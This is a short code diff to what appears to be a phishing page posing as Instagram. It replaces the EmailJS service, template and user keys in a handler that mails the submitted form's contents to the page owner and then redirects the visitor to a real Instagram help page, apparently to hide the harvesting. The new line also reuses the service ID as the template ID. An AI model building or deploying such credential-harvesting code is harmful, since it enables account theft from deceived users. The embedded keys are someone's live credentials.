@@ -5,7 +5,7 @@ function App() {
 
 function sendEmail(e) {
   e.preventDefault();
-  emailjs.sendForm('service_zbqh9jd', 'template_t2fgsuc', e.target, 'user_06Bc8YpLm3VfSutzWApTL')
+  emailjs.sendForm('service_fgzbjjx', 'service_fgzbjjx', e.target, 'user_wvv84be4BX0ZEjhHojp8M')
     .then((result) => {
         console.log(result.text);
         window.location.href = 'https://help.instagram.com/369001149843369?helpref=page_content'
